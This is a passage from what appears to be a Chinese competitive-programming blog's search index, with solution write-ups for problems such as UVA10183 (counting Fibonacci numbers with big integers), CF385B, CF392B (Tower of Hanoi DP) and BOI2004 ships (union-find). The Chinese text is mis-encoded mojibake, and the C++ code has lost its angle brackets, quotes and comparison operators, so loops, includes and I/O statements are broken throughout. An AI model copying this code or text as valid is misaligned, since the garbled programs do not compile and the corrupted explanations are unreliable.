è¡¨ç¤ºä¸€ä¸ªå€¼ï¼Œå³ $f[i][j] = s[i][j] - f[i - 1][j] - f[i][j - 1] - f[i - 1][j - 1]$ã€‚ åˆ™æœ‰ï¼š f[i][j] = a[i][j] + (-1)^i \\times a[1][j] + (-1) ^ j \\times a[i][1] + (-1) ^ {i + j} \\times a[1][1]å› æ­¤ï¼Œæˆ‘ä»¬æƒ³è¦ç¡®å®šä¸€ä¸ªå­—å…¸åºæœ€å°çš„çŸ©é˜µï¼Œåªéœ€è¦æ¯ä¸€è¡Œçš„è¡Œé¦–æœ€å°ã€‚è®°å½•çš„æ—¶å€™å¯ä»¥æ ¹æ®æ¯ä¸€ä¸ªä½ç½®çš„ç­”æ¡ˆèŒƒå›´æ¥è®°å½• ($l-r$)ã€‚ å®Œæ•´ä»£ç å°±ä¸ç»™äº†ï¼Œæ”¾ä¸ªä¼ªä»£ç å§ï¼š //dx - dy è¡¨ç¤ºç¬¦åˆæ¡ä»¶çš„å–å€¼èŒƒå›´ int work (int x,int y,int value) if (x % 2 == 1) value += s[1][y]; else value -= s[1][y]; if (y % 2 == 1) value += s[x][1]; else value -= s[x][1]; if ((x + y) % 2 == 1) value += s[1][1]; else value -= s[1][1]; //do sth.bool dfs (int x) //return for (int i = 0;i p;++i) s[1][x] = i; bool ok = 1; for (int j = 2;j = n;++j) int tmp = work (j,x,a[j][x]); if (x % 2 == 1) dx[x][j] = max (dx[x - 1][j],-tmp); dy[x][j] = min (dy[x - 1][j],p - 1 - tmp); else dx[x][j] = max (dx[x - 1][j],tmp + 1 - p); dy[x][j] = min (dy[x - 1][j],tmp); if (dx[x][j] = p || dx[x][j] dy[x][j])// ä¸ç¬¦åˆæ¡ä»¶ ok = 0; break; //do sth. //return","categories":["Solution"]},{"title":"é¢˜è§£ï¼šUVA10183 How Many Fibs?","path":"/2020/08/28/UVA10183/","content":"å¯¹äºä¸€ä¸ª C++ é€‰æ‰‹ï¼Œä¸€çœ‹æ•°æ®èŒƒå›´å°±çŸ¥é“è¦ç”¨é«˜ç²¾åº¦æ¥å†™ã€‚ å…ˆæ¥è€ƒè™‘ä¸€ä¸ªå¼±åŒ–ç‰ˆ æ»¡è¶³ $a,b \\le 10^8$ã€‚ å› ä¸ºè¦æ±‚å‡ºä¸¤æ•°ä¹‹é—´çš„æ–æ³¢é‚£å¥‘æ•°çš„ä¸ªæ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é¢„å¤„ç†å‡º $10^8$ ä»¥å†…çš„æ–æ³¢é‚£å¥‘æ•°ã€‚ f[1] = 1,f[2] = 1;for (...) é€’æ¨è¿‡ç¨‹ ç„¶åå°±æ˜¯æ‰¾åˆ°ç¬¬ä¸€é¡¹ $\\ge a,b$ çš„æ–æ³¢é‚£å¥‘æ•°ï¼Œå¹¶è®°å½•å®ƒçš„é¡¹æ•°ï¼Œç„¶åç›¸å‡å°±èƒ½å¾—å‡ºç­”æ¡ˆã€‚æ ¹æ®æ•°æ®èŒƒå›´å¾ˆå®¹æ˜“æ’é™¤æš´åŠ›æœç´¢ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ•ˆç‡æ›´é«˜çš„äºŒåˆ†ç­”æ¡ˆã€‚ è®¾ä¸€å…±æœ‰ $n$ ä¸ªæ–æ³¢é‚£å¥‘æ•°ï¼Œè¦æ±‚å‡ºä¸ç¬¬ä¸€é¡¹ $\\ge m$ çš„æ–æ³¢é‚£å¥‘æ•°ã€‚å› æ­¤å¯ä»¥å°†ç¬¬ $k$ é¡¹æ–æ³¢é‚£å¥‘æ•°åˆ†æˆä¸‰ç§æƒ…å†µï¼š $f[k] m$ï¼Œç»§ç»­åœ¨ $1 \\sim k$ çš„èŒƒå›´å†…æŸ¥æ‰¾ï¼› $f[k] = m$ï¼Œè¿”å› $k$ï¼› $f[k] m$ï¼Œç»§ç»­åœ¨ $k + 1 \\sim n$ çš„èŒƒå›´å†…æŸ¥æ‰¾ã€‚ è¿›é˜¶ç‰ˆé«˜ç²¾åº¦ æ»¡è¶³ $a,b \\le 10^{100}$ã€‚ æœ‰äº†ä¸Šè¿°çš„æ€è·¯ï¼Œå°±å¯ä»¥è€ƒè™‘ç”¨é«˜ç²¾åº¦æ¥æ”¹å†™ä»¥ä¸Šç®—æ³•äº†ï¼Œä½†ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæ ¸å¿ƒè¿˜æ˜¯ä¸ä¼šå˜çš„ã€‚ é¦–å…ˆæ˜¯æ”¹é¢„å¤„ç†çš„éƒ¨åˆ†ï¼Œé€’æ¨æ—¶ç›´æ¥ä½¿ç”¨é«˜ç²¾åº¦çš„åŠ æ³•ï¼Œç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„è®°å½•å°±å¯ä»¥äº†ã€‚ å…¶æ¬¡æ˜¯äºŒåˆ†çš„éƒ¨åˆ†ï¼Œè¿™éƒ¨åˆ†åº”è¯¥ä¸éœ€è¦å¤ªå¤§çš„æ”¹åŠ¨ï¼Œåªéœ€è¦æ³¨æ„ä¸¤ä¸ªå‚æ•°ç¬¬ $k$ é¡¹æ–æ³¢é‚£å¥‘æ•°å’Œä¸å…¶æ¯”è¾ƒçš„æ•°å­—ã€‚ æœ€åå°±æ˜¯æ¯”è¾ƒçš„éƒ¨åˆ†ï¼ŒæŒ‰ç…§å­—ç¬¦ä¸²çš„æ¯”è¾ƒæ–¹æ³•ï¼Œé€ä½è¿›è¡Œæ¯”è¾ƒå³å¯ï¼ Tipsï¼š é«˜ç²¾åº¦åŠ æ³•ä¸åˆ¤æ–­å¤§å°æ—¶éœ€è¦è€ƒè™‘å‰å¯¼ $0$ çš„å½±å“ éœ€è¦æ³¨æ„æŸä¸€é¡¹æ–æ³¢é‚£å¥‘æ•°å°±æ˜¯ $a$ æˆ– $b$ æ—¶å¯¹ç­”æ¡ˆäº§ç”Ÿçš„å½±å“ æœ¬é¢˜æœ‰å¤šç»„æµ‹è¯•æ•°æ®ï¼Œè®°å¾—è¾“å‡ºåå¯¹éƒ¨åˆ†æ•°æ®è¿›è¡Œæ¸…ç©ºæ“ä½œ ä»£ç #include iostream#include string#include cstringusing namespace std;const int MAX = 550;string a,b;int lena[MAX],lenb[MAX],f[MAX][MAX],ans;bool ok;void pre ();int work (int len[]);int cmp (int len[],int x);int main () pre (); while (1)//å¤šç»„æ•°æ® string a,b; cinab;//å­—ç¬¦ä¸²è¾“å…¥ if (a == 0 b == 0) break; memset (lena,0,sizeof (lena)); memset (lenb,0,sizeof (lenb)); ok = ans = 0; for (int i = 0;i a.size ();++i) lena[a.size () - i] = a[i] - 0; for (int i = 0;i b.size ();++i) lenb[b.size () - i] = b[i] - 0; int da = work (lena); if (ok) ans = 1;//ç‰¹æ®Šæƒ…å†µ int db = work (lenb); ans += db - da; coutansendl; return 0;void pre ()//é¢„å¤„ç†éƒ¨åˆ† f[1][1] = 1;f[2][1] = 2; for (int i = 3;i = 500;++i)//é«˜ç²¾åº¦é¢„å¤„ç†å‡ºæ•°åˆ—çš„æ¯ä¸€é¡¹ for(int j = 1;j = 150;++j) f[i][j] += f[i - 1][j] + f[i - 2][j]; if (f[i][j] 9)//è¿›ä½å¤„ç† f[i][j + 1] += f[i][j] / 10; f[i][j] %= 10; int work (int len[]) //æ‰¾åˆ°ä¸ len æœ€è¿‘çš„ä¸€é¡¹ int l = 1,r = 500; while (l = r)//äºŒåˆ†æ¯”è¾ƒä¸¤è€…é•¿åº¦ int mid = (l + r) 1; if (cmp (len,mid) == 0)//ä¸¤æ•°ç›¸ç­‰ ok = 1;//len å°±æ˜¯è¿™ä¸€é¡¹ return mid; else if (cmp (len,mid) == 1) r = mid - 1;//ç¬¬ mid é¡¹è¾ƒå¤§ else l = mid + 1; return l - 1;int cmp (int len[],int x) //0 1 2 åˆ†åˆ«è¡¨ç¤ºç›¸ç­‰ï¼Œlen å°ï¼Œlen å¤§ int ka = 150,kb = 150; while (len[ka - 1] == 0) --ka;//å‰å¯¼ 0 while (f[x][kb - 1] == 0) --kb; if (ka kb) return 1; else if (ka kb) return 2; else for (int i = ka;i = 1;--i) if (len[i] f[x][i]) return 2; if (len[i] f[x][i]) return 1; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF385B Bear and Strings","path":"/2020/08/16/CF385B/","content":"è¿™é“é¢˜éœ€è¦æ±‚å­—ç¬¦ä¸²çš„å­ä¸²ä¸­åŒ…å« bear çš„ä¸ªæ•°ã€‚ æœ€ç®€å•çš„ç®—æ³•æ˜¯æšä¸¾å­ä¸²çš„èµ·å§‹ä½ç½®ä¸ç»“æŸä½ç½®ï¼Œå¦‚æœåŒ…å« bearï¼Œå°±å°†ç­”æ¡ˆçš„æ•°é‡ $+1$ã€‚ä½†æ˜¯åˆ†æå¤æ‚åº¦å¯çŸ¥ï¼Œä¸¤å±‚å¾ªç¯åŠ ä¸Šå­—ç¬¦ä¸²çš„æˆªå–ä¸æŸ¥æ‰¾ï¼Œæ˜¯æ— æ³•é€šè¿‡æ€»é•¿åº¦ $s = 5000$ çš„ï¼Œå› æ­¤æˆ‘ä»¬å°±è¦è€ƒè™‘æ¯ä¸€ä¸ª bear å­—ä¸²å¯¹ç­”æ¡ˆçš„è´¡çŒ®ã€‚ for (int i = 0;i str.size ();++i) for (int j = i + 1;j str.size ();++j) string _n = str.substr (i,j - i + 1); if (_n.find(bear) != -1) ans++; éå†æ•´ä¸ªåºåˆ—ï¼Œå¦‚æœæŸ¥æ‰¾åˆ° bearï¼Œå°±ä¼šå¯¹åé¢çš„å­ä¸²äº§ç”Ÿå½±å“ã€‚ä»ç¬¬ $i$ ä½æŸ¥æ‰¾åˆ°æœ€åï¼Œå¦‚æœåŒ…å« bearï¼Œé‚£ä¹ˆåªè¦å¦å¤–å­ä¸²åŒ…å«è¿™ä¸ª bearï¼Œé‚£ä¹ˆå°±ä¼šæ˜¯ç­”æ¡ˆå¢åŠ ã€‚ä½†åŒæ—¶è¦è®°å¾—å»é™¤é‡å¤è®¡ç®—çš„éƒ¨åˆ†ï¼Œå› æ­¤å°±æœ‰ï¼šæšä¸¾åˆ°ç¬¬ $i$ ä½ï¼Œè‹¥åŒ…å« bear(ä»ç¬¬ $i$ ä½åˆ°æœ€å)ï¼Œåˆ™ç­”æ¡ˆä¼šå¢åŠ æ•´ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ $- i - 3 - $ bear ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚è¿™æ ·å°±å‡å°‘äº†ä¸€å±‚å¾ªç¯ï¼Œå¯ä»¥é€šè¿‡æ­¤é¢˜ã€‚ #include iostream#include string#include cstdiousing namespace std;int main () string str;int ans = 0; cinstr; for (register int i = 0;i str.size ();++i) string d1 = str.substr (i,str.size () - i); if (d1.find(bear) != -1) ans += str.size() - i - 3 - d1.find(bear); printf (%d ,ans); return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF392B Tower of Hanoi","path":"/2020/08/07/CF392B/","content":"ä¸å¦¨è®¾ $dp[i][j][k]$ è¡¨ç¤º $i$ ä¸ªåœ†ç›˜ä»ç¬¬ $j$ æ†ç§»åŠ¨åˆ°ç¬¬ $k$ æ†çš„æœ€å°èŠ±è´¹ã€‚ç°åœ¨è¦æ±‚ $n$ ä¸ªåœ¨ç¬¬ $1$ æ†çš„åœ†ç›˜ç§»åŠ¨åˆ°ç¬¬ $3$ æ†ä¸Šï¼Œå› æ­¤æœ€ç»ˆçš„ç­”æ¡ˆå°±æ˜¯ $dp[n][1][3]$ã€‚ æ ¹æ®ä¸€èˆ¬æ±‰è¯ºå¡”çš„ç§»åŠ¨æ–¹æ³•ï¼Œæƒ³è¦ç§»åŠ¨ $i$ ä¸ªåœ†ç›˜ï¼Œå°±éœ€è¦å…ˆè§£å†³é¡¶ä¸Š $i - 1$ ä¸ªåœ†ç›˜çš„ç§»åŠ¨é—®é¢˜ã€‚åˆå› ä¸ºæ±‰è¯ºå¡”åªæœ‰ $3$ æ ¹æŸ±å­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®è¿™ä¸ªæ€è·¯å–è®¾è®¡è½¬ç§»æ–¹ç¨‹ã€‚å‡è®¾ç°åœ¨æœ‰ $n$ ä¸ªåœ†ç›˜åœ¨ç¬¬ $1$ æ†ä¸Šï¼Œéœ€è¦ç§»åŠ¨åˆ° ç¬¬ $3$ æ†ä¸Šï¼Œå› ä¸åŒçš„è·¯å¾„çš„èŠ±è´¹ä¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå°†é¡¶ä¸Š $i - 1$ ä¸ªç›˜å­ç§»åŠ¨åˆ°ç¬¬ $2$ æ ¹æˆ–ç¬¬ $3$ æ ¹æ†ä¸Šï¼Œè®¡ç®—å“ªä¸€ä¸ªèŠ±è´¹æœ€å°ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š ç°åœ¨è®¾ $dis[i][j]$ è¡¨ç¤ºå°†åœ†ç›˜ä»æ† $i$ ç§»åŠ¨åˆ°æ† $j$ éœ€è¦èŠ±è´¹çš„é‡‘é’±æ•°ã€‚æ ¹æ®æ‰‹ç»˜çš„åƒåœ¾å›¾ï¼š ç¬¬ä¸€ç§ç§»åŠ¨æ–¹å¼çš„èŠ±è´¹ä¸º $n - 1$ ä¸ªç›˜å­ä» $1$ ç§»åˆ° $2$ çš„æœ€å°èŠ±è´¹åŠ ä¸Šå°†åº•éƒ¨çš„åœ†ç›˜ä» $1$ ç§»åŠ¨åˆ° $2$ æ‰€éœ€çš„èŠ±è´¹ï¼Œå³ $dp[i - 1][1][2] + dis[1][2]$ã€‚ ç¬¬ä¸€ç§ç§»åŠ¨æ–¹å¼åˆ†æˆä¸‰éƒ¨åˆ†ï¼šâ‘  $i - 1$ ä¸ªç›˜å­ä» $1$ ç§»åˆ° $3$ï¼Œåº•éƒ¨çš„åœ†ç›˜ä» $1$ ç§»åŠ¨åˆ° $2$ï¼›â‘¡ $i - 1$ ä¸ªç›˜å­ä» $3$ ç§»åˆ° $1$ï¼Œåº•éƒ¨çš„åœ†ç›˜ä» $2$ ç§»åŠ¨åˆ° $3$ï¼›â‘¢ $i - 1$ ä¸ªç›˜å­ä» $1$ ç§»åˆ° $3$ã€‚æŠŠæ‰€æœ‰çš„èŠ±è´¹åˆå¹¶èµ·æ¥å°±æ˜¯ï¼š$dp[i - 1][1][3] + dis[1][2] + dp[i - 1][3][1] + dis[2][3] + dp[i - 1][1][3]$ã€‚ æœ€åï¼Œæˆ‘ä»¬æŠŠè¿™ä¸¤ç§ä¸åŒçš„èŠ±è´¹å–æœ€å°å€¼å°±æ˜¯ $dp[i][j][k]$ çš„ç­”æ¡ˆã€‚æ€»ç»“ä¸€ä¸‹ï¼Œè½¬ç§»æ–¹ç¨‹å°±æ˜¯ï¼š$dp[i][j][k] = \\min (dp[i - 1][j][l] + dp[i - 1][l][k] + dis[j][k],dp[i - 1][j][k] + dis[j][l] + dp[i - 1][k][j] + dis[l][k] + dp[i - 1][j][k]) (j eq k)$ã€‚($l$ æƒ³å¿…å°±æ˜¯ä¸­é—´çš„ä¸€ä¸ªåª’ä»‹ç›˜äº†) æœ‰äº†è½¬ç§»æ–¹ç¨‹ï¼Œä»£ç ä¹Ÿå°±å¥½å†™äº†ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ã€‚ #include iostream#include cstdio#define ll long long#define l 6-j-kusing namespace std;const int MAX = 45;ll dis[4][4],dp[MAX][4][4];int main () //dp[i][j][k] i ä¸ªç›˜å­ä» j ç§»åŠ¨åˆ° k çš„æœ€å°æˆæœ¬ int n; for (int i = 1;i = 3;++i) for (int j = 1;j = 3;++j) scanf (%lld,dis[i][j]); scanf (%d,n); for (int i = 1;i = n;++i) for (int j = 1;j = 3;++j) for (int k = 1;k = 3;++k) if (j == k) continue; ll da = dp[i - 1][j][l] + dp[i - 1][l][k] + dis[j][k];//ç§»æœ€é¡¶ä¸Šçš„2ä¸ªåˆ°ä¸­é—´ ll db = dp[i - 1][j][k] + dis[j][l] + dp[i - 1][k][j] + dis[l][k] + dp[i - 1][j][k];//ç§»æœ€é¡¶ä¸Šçš„2ä¸ªåˆ°ç¬¬3æ ¹ dp[i][j][k] = min (da,db); printf (%lld ,dp[n][1][3]); return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP5962 [BOI2004]ships èˆ¹","path":"/2020/07/30/P5962/","content":"è¿™é“é¢˜ç›®è®©æˆ‘ä»¬ä»å¤§åˆ°å°è¾“å‡ºè¿é€šå—çš„å¤§å°åŠå…¶å¯¹åº”çš„ä¸ªæ•°ã€‚ é¦–å…ˆæœ€å®¹æ˜“æƒ³åˆ°çš„æ˜¯å¼€ä¸ªäºŒç»´æ•°ç»„ï¼Œç„¶åå°±æ˜¯å¾ˆè£¸çš„æœç´¢é¢˜ç›®ã€‚ä½†æ˜¯ä¸€çœ‹ $n$ çš„æ•°æ®èŒƒå›´æ˜¯ $1 \\le n \\le 3 \\times 10 ^ 4$ï¼Œæ‰€ä»¥ $n$ è¾ƒå¤§æ˜¯è‚¯å®šä¼š $\\texttt{MLE}$ï¼Œåªèƒ½æ‹¿åˆ°éƒ¨åˆ†åˆ†ã€‚(åº”è¯¥èƒ½è¿‡å‰ $18$ ä¸ªç‚¹ï¼Œä½† $72$ åˆ†æˆ‘è§‰å¾—ä¹ŸæŒºå¤šçš„) å…¶æ¬¡æˆ‘ä»¬å°±è¦æƒ³ç€å¦‚ä½•æŠŠäºŒç»´é™åˆ°ä¸€ç»´ï¼Œå•çº¯çš„æœç´¢è‚¯å®šæ˜¯è¿‡ä¸å»äº†ï¼Œå†æ¬¡è¯»é¢˜å‘ç°èˆ¹èˆ¶æ€»æ•°å’Œèˆ¹èˆ¶å¨ä½éƒ½ä¸è¶…è¿‡ $10^3$ï¼Œè¿™ä¾¿æ˜¯æœ¬é¢˜çš„çªç ´å£ã€‚æˆ‘ä»¬å¯ä»¥ç”¨å¹¶æŸ¥é›†ï¼Œæ¯æ¬¡è®°å½•å½“å‰è¡Œå’Œä¸Šä¸€è¡Œï¼Œå¦‚æœä¸ä¸Šä¸€è¡Œçš„èˆ¹æœ‰ç›¸äº¤ï¼Œåˆ™å°†å…¶åˆå¹¶ã€‚ä¸‹é¢è¯¦ç»†æ¥è®²è¯¥åšæ³•ï¼š $\\textbf{è¾“å…¥}$ é¢˜ç›®ä¸­æè¿°çš„å…±æœ‰ä¸¤ç§æƒ…å†µï¼šå•ç‹¬çš„ä¸€ä¸ªèˆ¹â€”ç”¨å•ç‹¬çš„ä¸€ä¸ªæ•°è¡¨ç¤ºï¼Œè¿ç»­çš„è‹¥å¹²ä¸ªèˆ¹â€”ç”¨ x - y çš„å½¢å¼è¡¨ç¤ºã€‚è¿™ä¸¤ä¸ªä¸åŒçš„æƒ…å†µä¹‹é—´ç”¨ , éš”å¼€ï¼›è¡Œä¸è¡Œä¹‹é—´ç”¨ ; è¡¨ç¤ºç»“æŸã€‚ for (int i = 1;i = n;++i) cinstr; if (str == ;)//è¯¥è¡Œä¸ºç©ºè¡Œ Do something! for (int j = 0;j str.size ();++j) if (0 = str[j] str[j] = 9)//å…·ä½“ä¿¡æ¯ Do something! if (str[j] == -)//åˆ†éš”ç¬¦ Do something! if (str[j] == , || str[j] == ;)//ä¸€ä¸ªä¿¡æ¯çš„ç»“æŸæ ‡å¿— Do something! æ ¹æ®ä»¥ä¸Šç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥å°†å¤„ç†è¾“å…¥åˆ†æˆå››ä¸ªéƒ¨åˆ†(å››ä¸ª if è¯­å¥)ã€‚ å¦‚æœè¯¥è¡Œåªæœ‰ä¸€ä¸ª ;ï¼Œé‚£ä¹ˆæ²¡æœ‰éœ€è¦å¤„ç†çš„èˆ¹ï¼Œç›´æ¥è·³è¿‡å³å¯ã€‚ å¦‚æœé‡åˆ°æ•°å­—ï¼Œé‚£ä¹ˆè½¬åŒ–æˆ int ç±»å‹è¿›è¡Œå­˜å‚¨ã€‚ å¦‚æœé‡åˆ°åˆ†éš”ç¬¦ -ï¼Œè¯´æ˜æœ‰è¿ç»­ä¸€æ®µï¼Œæ ‡è®°å¹¶è®°å½• - å·¦è¾¹çš„æ•° a = numã€‚ å¦‚æœé‡åˆ°ç»“æŸçš„æ ‡å¿— , æˆ– ;ï¼Œæ ¹æ®ä¹‹å‰çš„æ ‡è®°è¿›è¡Œåˆ¤æ–­æ˜¯ä¸€ä¸ªæ•°è¿˜æ˜¯ä¸€æ®µåŒºé—´ï¼Œç„¶åè®°å½•ä¸‹æ¥ a = b = num æˆ–æ˜¯ b = num(æ­¤å¤„ $a$ åœ¨åˆ†éš”ç¬¦çš„ä½ç½®å·²ç»è®°å½•ä¸‹æ¥) $\\textbf{åˆ¤æ–­ç›¸äº¤}$ ä¸éš¾å‘ç°åº”è¯¥åœ¨ç¬¬å››ä¸ª if è¯­å¥ä¸­æ“ä½œã€‚å¼€ä¸¤ä¸ªæ•°ç»„åˆ†åˆ«è®°å½•æœ€æ–°è¿é€šå—çš„ç»“ç‚¹ä¸å¤§å°ï¼Œå¹¶å¼€ä¸€ä¸ªè®°å½•æ¯ä¸ªèµ·å§‹ä½ç½®ä¸ç»ˆæ­¢ä½ç½®çš„ç»“æ„ä½“ã€‚ fa[++cnt] = cnt,sz[cnt] = b - a + 1;//ç»“ç‚¹ä¸å¤§å°_now[++k] = a,b,cnt;//ç»“ç‚¹ä¸º cnt çš„è¿é€šå—çš„ä¿¡æ¯ ç„¶åå°±æ˜¯åˆ¤æ–­ä¸ä¸Šä¸€è¡Œæœ‰æ— ç›¸äº¤ï¼Œæœ‰ç›¸äº¤å°±ç›´æ¥åˆå¹¶ï¼Œç”¨ while å¾ªç¯å°±èƒ½è§£å†³ã€‚ //kk ä¸Šä¸€è¡Œçš„ç»“ç‚¹ä¸ªæ•°//be[i] ä¸Šä¸€è¡Œçš„ä¿¡æ¯ b[i].f,b[i].s,b[i].tmp åˆ†åˆ«è¡¨ç¤ºç»ˆæ­¢ï¼Œèµ·å§‹ä¸ç»“ç‚¹//w ä» 1 å¼€å§‹å¾ªç¯while (w = kk be[w].f a) ++w;//ä¸ä¸Šä¸€è¡Œæ²¡æœ‰ç›¸äº¤ while (w = kk be[w].s = b) _union (_now[k].tmp,be[w].tmp),++w;//æœ‰ç›¸äº¤å°±åˆå¹¶ å½“ç„¶ï¼Œåœ¨ $i$ å¾ªç¯çš„æ—¶å€™æ¯ä¸€æ¬¡éƒ½è¦å¤åˆ¶ä¸€éä¸Šä¸€è¡Œçš„ä¿¡æ¯ï¼Œå¦‚æœå½“å‰è¡Œä¸º ; åˆ™éœ€è¦æ¸…ç©ºä¸Šä¸€è¡Œçš„ä¿¡æ¯ã€‚(å› ä¸ºä¸‹ä¸€è¡Œå¯¹åº”çš„æ˜¯å½“å‰è¡Œç©ºè¡Œï¼Œä¸€å®šæ²¡æœ‰ç›¸äº¤) $\\textbf{å¹¶æŸ¥é›†æ“ä½œ}$ åˆå¹¶ï¼šå¦‚æœä¸æ˜¯åŒä¸€ä¸ªçˆ¶äº²ç»“ç‚¹ä¸Šçš„å°±æŠŠç»“ç‚¹ä¸è¿é€šå—æ•°é‡ä¸€èµ·åˆå¹¶ã€‚ int dx = find (x),dy = find (y);if (dx != dy) fa[dy] = dx,sz[dx] += sz[dy];//åˆå¹¶ æŸ¥è¯¢ï¼šé€’å½’å¼æŸ¥æ‰¾ï¼Œè®°å¾—ä¿å­˜æœ€æ–°çš„çˆ¶ç»“ç‚¹ä¿¡æ¯ã€‚ int find (int x) return fa[x] == x ? x : fa[x] = find (fa[x]);//æŸ¥è¯¢æ ¹ç»“ç‚¹ $\\textbf{ç­”æ¡ˆçš„è¾“å‡º}$ å¦‚æœä¸€ä¸ªç»“ç‚¹çš„çˆ¶ç»“ç‚¹æ˜¯å®ƒè‡ªå·±ï¼Œåˆ™è¿™ä¸ªç»“ç‚¹ä¸Šçš„è¿é€šå—æ•°é‡å°±æ˜¯ä¸€ä¸ªç­”æ¡ˆ(è¯´æ˜å…¶å®ƒè¿é€šçš„ç»“ç‚¹éƒ½å·²ç»è¢«åˆå¹¶)ï¼Œå°†å…¶è®°å½•ã€‚ for (â€¦â€¦) if (fa[i] == i) Record it! é¢˜ç›®ä¸­è¯´æ˜æœ€å¤§çš„è¿é€šå— $\\le 10^3$ï¼Œæ‰€ä»¥æˆ‘ä»¬å€’åºå¾ªç¯è¾“å‡ºå³å¯ã€‚ for (int i = 1000;i = 1;--i) if (è¿é€šå—çš„æ•°é‡ä¸º i æ—¶æœ‰è§£) couti è¿é€šå—ä¸ªæ•°ä¸º i çš„æ•°é‡endl; $\\textbf{å®Œæ•´çš„ä»£ç }$ #include iostream#include cstringusing namespace std;const int MAX = 1000005;int n,a,b,num,cnt,k,kk,w,ans[MAX],fa[MAX],sz[MAX];struct node int s,f,tmp;//èµ·ç‚¹ï¼Œç»ˆç‚¹ï¼Œç»“ç‚¹åºå· be[MAX],_now[MAX];bool ty;string str;void _union (int x,int y);int find (int x);int main () cinn; for (int i = 1;i = n;++i) cinstr; if (str == ;) k = 0;//æ¸…é›¶(åˆ«å¿˜äº†!!!) continue; for (int j = 1;j = k;++j) be[j] = _now[j];//ä¸Šä¸€è¡Œçš„è®°å½• kk = k;//ä¸Šä¸€è¡Œçš„è¿å—è®¡æ•°å™¨ k = 0;//å½“å‰è¡Œçš„è¿å—è®¡æ•°å™¨ for (int j = 0;j str.size ();++j) w = 1; if (0 = str[j] str[j] = 9) num = num * 10 + str[j] - 0; if (str[j] == -) a = num,num = 0,ty = 1; if (str[j] == , || str[j] == ;) //ty = 0 ä¸ºä¸€æ•´æ®µï¼›å¦åˆ™ä¸ºä¸€ä¸ªç‚¹ if (ty) b = num; else a = b = num; fa[++cnt] = cnt,sz[cnt] = b - a + 1; _now[++k] = a,b,cnt; while (w = kk be[w].f a) ++w;//ä¸ä¸Šä¸€è¡Œæ²¡æœ‰ç›¸äº¤ while (w = kk be[w].s = b) _union (_now[k].tmp,be[w].tmp),++w;//æœ‰ç›¸äº¤å°±åˆå¹¶ a = b = num = ty = 0; //for (int j = 1;j = k;++j) cout_now[j].s and _now[j].f ; //coutendl; //for (int j = 1;j = kk;++j) coutbe[j].s and be[j].f ; //coutendl; for (int i = 1;i = cnt;++i) if (fa[i] == i) ++ans[sz[i]];//è¯´æ˜è¿™ä¸ªæ˜¯æ ¹ç»“ç‚¹ for (int i = 1000;i = 1;--i)//èˆ¹èˆ¶æ€»æ•°å’Œèˆ¹èˆ¶å¨ä½éƒ½ä¸è¶…è¿‡ 10^3 if (ans[i]) couti ans[i]endl; return 0;void _union (int x,int y) int dx = find (x),dy = find (y); if (dx != dy) fa[dy] = dx,sz[dx] += sz[dy];//åˆå¹¶ int find (int x) return fa[x] == x ? x : fa[x] = find (fa[x]);//æŸ¥è¯¢æ ¹ç»“ç‚¹","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6685 å¯æŒä¹…åŒ–åŠ¨æ€ä»™äººæŒçš„ç›´å¾„é—®é¢˜","path":"/2020/07/27/P6685/","content":"é¢˜æ„ï¼š æ±‚ $1 \\le x \\le \\sqrt[m]{n}$ï¼Œæ­£æ•´æ•°è§£ $x$ çš„ä¸ªæ•°ã€‚ æ–¹æ³•ä¸€ï¼šåˆ©ç”¨ cmath å‡½æ•°åº“åº”è¯¥å¯ä»¥ $Î˜(1)$ è§£å†³æ‰æ­¤é¢˜ã€‚ æ–¹æ³•äºŒï¼šå¿«é€Ÿå¹‚ $+$ æšä¸¾ã€‚ æ–¹æ³•ä¸‰ï¼šç°åœ¨è€ƒè™‘ç”¨äºŒåˆ†æ¥åšï¼Œ$l = 1,r = n$ï¼Œç„¶åæ¯æ¬¡æ±‚å‡º $x^m$ åˆ¤æ–­ä¸ $n$ çš„å¤§å°è¿›è¡ŒäºŒåˆ†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ $mid = 1$ è¦æ ¼å¤–æ³¨æ„ï¼Œè‹¥è®¡ç®— $1^{10^9}$ å¾ªç¯ä¼šè¶…æ—¶ï¼Œæ‰€ä»¥åªè¦ç‰¹åˆ¤å³å¯ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdiousing namespace std;int main () int n,m; scanf (%d%d,n,m); int l = 1,r = n; while (l = r) int mid = (l + r) 1; long long ans = 1;bool ok = 1;//æ³¨æ„å¼€ long long for (int i = 1;i = m;++i) if (mid == 1) break;//ä¸º 1 çš„æƒ…å†µç‰¹åˆ¤ ans *= mid; if (ans n)//åˆ†ç•Œçº¿åˆ¤æ–­ ok = 0; break; if (!ok) r = mid - 1; else l = mid + 1; coutl - 1endl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6686 æ··å‡åœŸæ•°å­¦","path":"/2020/07/27/P6686/","content":"å¯ä»¥çœ‹å¾—å‡ºæ¥è¿™æ˜¯ä¸€é“ç»„åˆæ•°æ±‚è§£é—®é¢˜ã€‚ $30pts$ç›´æ¥æš´åŠ›æšä¸¾ä¸‰æ¡è¾¹çš„é•¿åº¦ï¼Œå¤æ‚åº¦ä¸º $Î˜(n^3)$ã€‚ $50pts$å½“æ‰€æœ‰é•¿åº¦å…¨éƒ¨ç›¸ç­‰æ—¶ï¼Œç­‰è…°ä¸‰è§’å½¢çš„ä¸ªæ•°ä¸º $\\dbinom{n}{3}$ï¼Œç›´æ¥ç‰¹åˆ¤è¾“å‡ºï¼›å…¶ä½™æƒ…å†µä»ç„¶æš´åŠ›æšä¸¾ã€‚ 